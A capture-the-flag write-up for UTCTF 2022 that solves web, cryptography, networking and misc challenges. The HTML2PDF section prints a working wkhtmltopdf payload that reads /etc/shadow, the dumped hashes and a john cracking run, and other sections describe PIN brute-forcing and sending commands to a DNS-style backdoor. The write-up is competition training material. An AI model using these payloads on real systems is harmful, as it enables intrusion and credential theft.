+++
title = "Writeup: UTCTF 2022"
#publishDate = 2021-01-31T19:00:00+00:00
draft = true
math = true
+++

- Website: https://utctf.live/
- CTFTime: https://ctftime.org/event/1582

## Websockets? (Web)

> Can you hack my website?
>
> By Daniel Parks (@danielp on discord)
>
> http://web1.utctf.live:8651

The employee login page (`/internal/login`) uses websockets to log in.

The JS source is as such:

```
document.querySelector("input[type=submit]").addEventListener("click", checkPassword);

function checkPassword(evt) {
	evt.preventDefault();
	const socket = new WebSocket("ws://" + window.location.host + "/internal/ws")
	socket.addEventListener('message', (event) => {
		if (event.data == "begin") {
			socket.send("begin");
			socket.send("user " + document.querySelector("input[name=username]").value)
			socket.send("pass " + document.querySelector("input[name=password]").value)
		} else if (event.data == "baduser") {
			document.querySelector(".error").innerHTML = "Unknown user";
			socket.close()
		} else if (event.data == "badpass") {
			document.querySelector(".error").innerHTML = "Incorrect PIN";
			socket.close()
		} else if (event.data.startsWith("session ")) {
			document.cookie = "flask-session=" + event.data.replace("session ", "") + ";";
			socket.send("goodbye")
			socket.close()
			window.location = "/internal/user";
		} else {
			document.querySelector(".error").innerHTML = "Unknown error";
			socket.close()
		} 
	})
}
```

We need to send a username and password (pin), and the server will send us a
session cookie if we're successful. It also tells us when we have a valid user,
which lets us guess the username (`admin`).

Inspecting the HTML source tells us that the password is probably just 3 digits:

```
<!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack -->
<input name="password" type="password" placeholder="PIN" required pattern="(\d{3}|\d{16})">
```

All that's left is brute-force the password to obtain the session cookie.


```
$ ./websockets 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA
$ curl -sS http://web1.utctf.live:8651/internal/user -b 'flask-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA' | grep utflag
        utflag{w3bsock3ts}
```

[websockets.go](websockets/websockets.go)

## HTML2PDF (Web)

> My friend bet me I couldn't pwn this site. Can you help me break in?
>
> (bruteforcing is not necessary or helpful to solve this problem)
>
> *by mattyp*
>
> http://web2.utctf.live:9854

The website renders HTML in the input form into PDFs. The placeholder contains
an `<img>` to an external server that gets rendered, so we can try SSRF with
something like `<img src="http://<our-server>">`. The challenge server sent us a
request like so:

```
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/9.0 Safari/602.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: <our-server>
```

The User-Agent header tells us that the server is using
[`wkhtmltopdf`][wkhtmltopdf-gh]. A quick issue search lands us on issue
[#4536][wkhtmltopdf-gh-issue], which tells us that `wkhtmltopdf` will execute
code and include remote files for us (if not configured correctly).

[wkhtmltopdf-gh]: https://github.com/wkhtmltopdf/wkhtmltopdf/
[wkhtmltopdf-gh-issue]: https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536

The server also seems to be running as root, since changing the payload in the
issue slightly (`/etc/passwd` -> `/etc/shadow`) works, and the server gives us
the password entries.

```
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<body>

<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/shadow");
x.send();
</script>

</body></html>
```

The server sends us the shadow entries, including the following:

```
dave:$1$M.bfkUDw$jjybwVXMb4waSV0fY5gp0/:19062:0:99999:7:::
john:$1$EPS/Rl3g$5TLupCmddYSibyDaZtZhQ0:19062:0:99999:7:::
emma:$1$iasayt59$U1QnVGaDEJKyps3iHWv2P1:19062:0:99999:7:::
WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::
```

The last entry (`WeakPasswordAdmin`) seems promising, and in fact we can crack
it very quickly with a password cracker.

```
$ john <(echo 'WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:19062:0:99999:7:::')
Loaded 1 password hash (md5crypt [MD5 32/64 X2])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press 'q' or Ctrl-C to abort, almost any other key for status
sunshine         (WeakPasswordAdmin)
1g 0:00:00:00 100% 2/3 6.250g/s 11618p/s 11618c/s 11618C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Finally, we can use the cracked credentials to obtain the flag.

```
$ curl -sS http://web2.utctf.live:9854/admin -F username=WeakPasswordAdmin -F password=sunshine | grep utflag
      <p style="color:red"><b>utflag{b1g_r3d_t3am_m0v35_0ut_h3r3}</p>
```

## Failed Hash Function (Cryptography)

> I made this keyed hash function for my final project, but I got a 0...
> Apparently, there's too many collisions and you can recover the key after one
> hash. I don't believe it. In fact, if you can break my hash function 100
> times, I'll give you a flag! I'll even be nice -- you get two whole guesses to
> find the key. By oops (@oops on discord)
>
> `nc misc1.utctf.live 5000`
>
> [main.py](failed-hash-function/main.py)

We need to guess `k1` and `k2`, two random bytes, given the output of a hash
function that we can query twice with 16 bytes. The hash function is like so:

```
def print_hash(s):
    for x in s:
        for y in s:
            print(hex(trailing((k1 ^ x) * (k2 ^ y)))[2:], end='')
```

For each pair of positions in the 16-byte input, it xors the first part with
`k1`, the second part with `k2`, and multiplies them together, outputting the
number of trailing zero bits in the product.

Here, we remember how the number of trailing zero bits of a product $a \times b$
is equal to the sum of the number of trailing zeroes in $a$ and $b$. In short,
each number in the hash function reveals the number of matching trailing
bits we have in our input.

Since we can make two queries, we can try to guess the 4 low-order bits of each
key on the first attempt, and the 4 high-order bits on the second attempt.

The solution is as follows:

1. Try to obtain information on the 4 low-order bits by sending every single
   combination of the 4 low-order bits (`0x000102030405060708090a0b0c0d0e0f`).
2. Given the hash output, compute every single possible value of `k1` and `k2`
   that could produce that output. We are guaranteed to have fewer than 16
   possible values, because the $2^{8-4} = 16$.
3. For the second attempt, send every possible value of `k1` and `k2` we
   obtained in the previous step. We are guaranteed to obtain a single result.

Since step 2 (computing $2^{16}$ hash values) can be slow (a few seconds), we
can speed things up by precomputing key values for each possible hash output of
`0x000102030405060708090a0b0c0d0e0f`.

```
$ ./solve.py 
[+] Precomputing...: Done
[+] Opening connection to misc1.utctf.live on port 5000: Done
[+] Solving...: Done
[+] Receiving all data: Done (80B)
[*] Closed connection to misc1.utctf.live port 5000
[+] Dang... guess it really is broken :(
    utflag{Ju5t_u53_SHA256_LoLc4t5_9a114be7f}
```

[solve.py](failed-hash-function/solve.py)

## Sunset (Cryptography)

> subset sumset what did i do Wrap the value of key with utflag{} for the flag. By oops (@oops on discord)
>
> [main.py](sunset/main.py) [output.txt](sunset/output.py)

We are provided two public keys and some removed values, and we must find the
hash of some shared key generated between these two keypairs.

Inspecting the code, the algorithm is as follows:

```
def get_secret_key():
    key = []
    for i in range(1, N):
        x = random.randrange(1,10)
        key += [i] * x
    random.shuffle(key)
    return key
```

The private key is generated by generating a random (1-9) number of each number
from 1 to `N-1` (110). This list is then shuffled, but as we will find out
later, the shuffling does not affect the results in any way.

```
def compute_arr(arr, sk):
    for x in sk:
        new_arr = arr.copy()
        for y in range(N):
            new_arr[(x+y)%N] += arr[y]
            new_arr[(x+y)%N] %= MOD

        arr = new_arr
    return arr

def compute_public_key(sk):
    arr = [0] * N
    arr[0] = 1
    return compute_arr(arr, sk)
```

It then generates the public key. To do this, the it starts with an array of
length `N` with all zeroes except the first item, which is 1. Then, it calls
`compute_arr` with this array and the private key.  `compute_arr` then steps
through each key value `k`, such that `next[i] = prev[i] + prev[i-k % N] %
1000000007`.

```
remove_elements = random.sample(range(1,N), 20)

for x in remove_elements:
    A_sk.remove(x)
    B_sk.remove(x)

A_shared = compute_arr(B_pk, A_sk)
B_shared = compute_arr(A_pk, B_sk)

assert(A_shared == B_shared)
```

Then, the key exchange: it first chooses 20 values to delete from
both secret keys, and then calls `compute_arr(pk_a, sk_b)` and vice versa. This
somehow results in the same shared key for both Alice and Bob, which is then
hashed to obtain the key.

The challenge output contains the two public keys, the list of removed elements,
but not the key (our flag). In essence, we need to obtain
`compute_arr(compute_arr([1, 0, ..., 0], sk_a), remove_some_elements(sk_b))`.

To begin solving the challenge, we think about what `compute_arr` is doing: It
is perfoming one step per secret key value, where it produces `arr +
rotate_left(arr, sk)` each step.

> Warning, bad $\TeX$ follows. I apologise for the garbage notation in advance...

In other words, with secret key $SK = [a, b]$ and initial array $A_0$,

$$
\begin{equation*}
    \begin{aligned}
        A_1[i] & = A_0[i] + A_0[i-a] \\\
        A_2[i] & = A_1[i] + A_1[i-b] \\\
               & = ( A_0[i] + A_0[i-a] ) + ( A_0[i-b] + A_0[i-b-a] ) \\\
               & = A_0[i] + A_0[i-a] + A_0[i-b] + A_0[i-a-b] \\\
    \end{aligned}
\end{equation*}
$$

(All addition is $\operatorname{mod} 10^9+7$ and indexing $\operatorname{mod} N$, omitted for brevity.)

Notice how the value of $A_2[i]$ does not depend on the order of $SK$. In fact,
the order of elements in $SK$ does not affect the result of `compute_arr` at
all, which is why the shuffle during key generation is meaningless.

Another way to think about `compute_arr` is with matrix multiplication. For
example, with $N = 3$, $SK = [1, 2]$, and initial array $A_0$,

$$
\begin{equation*}
    \begin{aligned}
        A_1 & = K_{SK[1]} A_0 \\\
        A_2 & = K_{SK[2]} A_1 \\\
    \end{aligned}
\end{equation*}
$$

Where

$$
\begin{equation*}
    \begin{aligned}
        K_1 & =
            I_3 +
            \begin{pmatrix}
                0 & 0 & 1 \\\
                1 & 0 & 0 \\\
                0 & 1 & 0 \\\
            \end{pmatrix}
            =
            \begin{pmatrix}
                1 & 0 & 1 \\\
                1 & 1 & 0 \\\
                0 & 1 & 1 \\\
            \end{pmatrix}
            \\\
        K_2 & =
            I_3 +
            \begin{pmatrix}
                0 & 1 & 0 \\\
                0 & 0 & 1 \\\
                1 & 0 & 0 \\\
            \end{pmatrix}
            =
            \begin{pmatrix}
                1 & 1 & 0 \\\
                0 & 1 & 1 \\\
                1 & 0 & 1 \\\
            \end{pmatrix}
            \\\
    \end{aligned}
\end{equation*}
$$

Here, $K_j$ is the the identity matrix plus the identity matrix columns rotated
to the left by $j$, and represents a single `compute_arr` step with key value
$SK[i] = j$.

Therefore, `compute_arr(a, sk)` is equivalent to

$$
\mathtt{compute\\\_arr} (A, SK) = ( \prod_{i = 1}^{|SK|} K_{SK[i]} ) A
$$

Also, notice that each $K_j$ matrix is invertible. This means that given $A_i$
and $SK_i$, we can compute the inverse for `compute_arr`:

$$
\mathtt{compute\\\_arr}^{-1} (A, SK) = ( \prod_{i = 1}^{|SK|} K_{SK[i]}^{-1} ) A
$$

Now, we can understand how the challenge code results in the same values for
both Alice and Bob. With Alice's and Bob's secret keys as $SK_A$ and $SK_B$,
respectively, the public keys are

$$
\begin{equation*}
    \begin{aligned}
    PK_A & = \mathtt{compute\\\_arr}(A_0, SK_A) \\\
    PK_B & = \mathtt{compute\\\_arr}(A_0, SK_B) \\\
    \end{aligned}
\end{equation*}
$$

Then, the algorithm removes some values $R$ to produce $SK^\prime_{A}$ and
$SK^\prime_{B}$, and computes

$$
\begin{equation*}
    \begin{aligned}
    Shared_A & = \mathtt{compute\\\_arr}(PK_B, SK^\prime_{A}) \\\
    Shared_B & = \mathtt{compute\\\_arr}(PK_A, SK^\prime_{B}) \\\
    \end{aligned}
\end{equation*}
$$

However, since (for our matrices) matrix multiplications are commutative, we can
rearrange terms like so:

$$
\begin{equation*}
    \begin{aligned}
    Shared_A & = \mathtt{compute\\\_arr}(PK_B, SK^\prime_{A}) \\\
             & = \mathtt{compute\\\_arr}(PK_B, SK^\prime_{A}) \\\
             & = ( \prod_{i = 1}^{|SK^\prime_{A}|} K_{SK^\prime_{A}[i]} ) PK_B \\\
             & = ( \prod_{i = 1}^{|SK^\prime_{A}|} K_{SK^\prime_{A}[i]} )
                 ( \prod_{i = 1}^{|SK_B|} K_{SK_B[i]} ) A_0 \\\
             & = ( \prod_{i = 1}^{|SK_B || SK^\prime_A|} K_{SK_B || SK^\prime_A [i]} ) A_0 \\\
             & = \mathtt{compute\\\_arr}(A_0, SK_B || SK^\prime_A) \\\
             & = \mathtt{compute\\\_arr}^{-1}(\mathtt{compute\\\_arr}(A_0, SK_B || SK_A), R) \\\
    \end{aligned}
\end{equation*}
$$

Remember that $SK^\prime_A$ is just $SK$ without some elements $R$, so, we can
"factor out" the $R$ like so:

$$
\begin{equation*}
    \begin{aligned}
    Shared_A & = \mathtt{compute\\\_arr}(A_0, SK_B || SK^\prime_A) \\\
             & = \mathtt{compute\\\_arr}^{-1}(\mathtt{compute\\\_arr}(A_0, SK_B || SK_A), R) \\\
    \end{aligned}
\end{equation*}
$$

This value is the same for $Shared_B$, which is why this key exchange results in
the same values for both Alice and Bob.

Now, all we need to do to solve the challenge is construct a
$\mathtt{merge\\\_arr}$ such that

$$
\begin{equation*}
    \begin{aligned}
    PK_A &= \mathtt{compute\\\_arr}(A_0, SK_A) \\\
    PK_B &= \mathtt{compute\\\_arr}(A_0, SK_B) \\\
    \mathtt{merge\\\_arr}(PK_A, PK_B) & = \mathtt{compute\\\_arr}(A_0, SK_A || SK_B) \\\
    \end{aligned}
\end{equation*}
$$

Remember how

$$
A_2[i] = A_0[i] + A_0[i-a] + A_0[i-b] + A_0[i-a-b]
$$

From this, it seems that the value of $A_2[i]$ equals the sum of $A_0[i -
(\textrm{every combination of up to 2 values in} \  SK)$. Indeed,

$$
\mathtt{compute\\\_arr}(A, SK)[i] = \sum A_0[i - (\textrm{every combination of
values in} \ SK)]
$$

Since $A_0 = [1, 0, \cdots, 0]$ (that is, only $A_0[0]$ is non-zero), this is
the same as the number of cases in which a combination of values in $SK$ sums to
$i$. we can now construct $\mathtt{merge\\\_arr}$ as such:

$$
\begin{equation*}
    \begin{aligned}
    PK_A[i] &= \textrm{number of times a combination of values in} \\ SK_A \\ \textrm{sums to} \\ i \\\
    PK_B[j] &= \textrm{number of times a combination of values in} \\ SK_B \\ \textrm{sums to} \\ j \\\
    \mathtt{merge\\\_arr}(PK_A, PK_B)[k] & = \textrm{number of times a combination of values in} \\ SK_A || SK_B \\ \textrm{sums to} \\ k \\\
    & = \sum PK_A[i] \cdot PK_B[j] \\ (\textrm{whenever} \\ i+j = k) \\\
    \end{aligned}
\end{equation*}
$$

Take it all together, implement and evalute
$\textrm{compute\\\_arr}^{-1}(\textrm{merge\\\_arr}(PK_A, PK_B), R)$ to obtain
the flag, being careful about overflows and operations $\operatorname{mod}
10^9+7$.

```
$ ./solve.py 
3f3ae3284970df318be8404747bb003fe47cd9bdbb57fc1da52a01b3c028180f
```

[solve.py](sunset/solve.py)

## Malformed Query (Networking)

> I was looking at my network traffic, and found some interesting packets that
> seem to malformed. Can you figure out what's going on?
>
> by mattyp
>
> [capture.pcapng](malformed-query/capture.pcapng)
> [server.go](malformed-query/server.go)

Inspecting the capture, most of the traffic is encrypted HTTPS, and some DNS
queries. However, there is some some interesting UDP traffic over port 9855.

```
 tshark -r capture.pcapng 'udp.port==9855'
   61   5.402771 192.168.0.79 → 3.93.213.98  UDP 69 63009 → 9855 Len=27
   62   5.443228  3.93.213.98 → 192.168.0.79 UDP 554 9855 → 63009 Len=512
   63   5.443899 192.168.0.79 → 3.93.213.98  UDP 322 63009 → 9855 Len=280
   64   5.489225  3.93.213.98 → 192.168.0.79 UDP 1106 9855 → 63009 Len=1064
```

If we look closely, it turns out it's a DNS-like protocol, with the first two
entries (61 and 62) corressponding to a ` publickey. IN TXT` request and the
server responding with a public key (which happens to be malformed, the PEM
header should be `BEGIN PUBLIC KEY` and not `BEGIN RSA PUBLIC KEY`).

The next two entries contain malformed DNS data, and looking at the server code
reveals that the client is sending an RSA-OAEP encrypted query containing a
command, to which the server responds with the command output, in this case
being a directory listing.

A quick check reveals that the server is still active:

```
$ drill @3.93.213.98 -p 9855 publickey txt
;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 8149
;; flags: qr rd ra ; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0 
;; QUESTION SECTION:
;; publickey.   IN      TXT

;; ANSWER SECTION:
publickey.      4919    IN      TXT     "-----BEGIN RSA PUBLIC KEY-----\010MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyljjH5MViK9eDX3TYlO8\010Cei+rVufA+lrsw36gv/Ntv34PBXebZBC8BSwy/t0jMHnn7+9fY0zum9sMwV7A7R9\0103RWt5WppeqPyhuFNlM8DoGN5RLjTVLLKvSG2df5c8IktfDpjdrgUYDOiMMN7ANVE\010yIK+Nt+RBoGK2fkKk3NljlmmXKKP"
publickey.      4919    IN      TXT     "U2yQZX6uHgMPXk1QSvXRsPcdWG255dBhVXK/\010rB2vAMOsD2QDMiUEa5KFgDxoBT3CH1H2nPCcXGux2j+gCpxyzzSdWrdxw64xmcGm\010rYWyC/lEygNDYc82JQJatHJSeDmz1TeA6LoY29QnKzSfrOZNvRxaB9NbbY7s9zRS\010JwIDAQAB\010-----END RSA PUBLIC KEY-----\010"

;; AUTHORITY SECTION:

;; ADDITIONAL SECTION:

;; Query time: 218 msec
;; SERVER: 3.93.213.98
;; WHEN: Mon Mar 14 07:55:00 2022
;; MSG SIZE  rcvd: 512
```

So all we need to do is retrieve the public key, send an encrypted (and
malformed) query to this server with a command like `cat flag.txt`, and read out
the response.  Unfortuantely, we could not find any libraries or tools that
would allow us to send malformed DNS messages, so we glued something together by
referencing the server source code.

```
$ ./malformed 
utflag{i_love_me_some_spicy_dns}
```

[malformed.go](malformed-query/malformed.go)
## The Grumpy Genie (Misc)

> Someone wrote an nft collection for UT, though its quite a mess and theres all
> this talk about a genie and Silvio Micali being the real satoshi
>
> 0x867D66C78235CD6c989FbFA34606FcfF637fB613
>
> https://pastebin.com/T7r9vFvg
>
> By Theo (@Raoul Duke on discord)

The linked pastebin contains code for a smart contract, but it doesn't seem
useful.

Searching for the address leads to [BcsScan][misc-grumpy-bcsscan], with no
transactions. However, this address is also used on the "Ropsten Testnet", which
is slightly more useful.

On [Etherscan][misc-grumpy-etherscan], we find one
[transaction][misc-grumpy-tx].  This transaction has some input, from which we
can extract the flag (near the end).

[misc-grumpy-bcsscan]: https://bscscan.com/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613
[misc-grumpy-etherscan]: https://ropsten.etherscan.io/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613
[misc-grumpy-tx]: https://ropsten.etherscan.io/tx/0xca78d2d51101fda93f3f8c62f4349dd23a7e5692cef667ab834c3611601f068f

```
$ wl-paste | xxd -r -p | strings | grep utflag
utflag{Did_Y0u_USe_Re3nTrancY?}
```

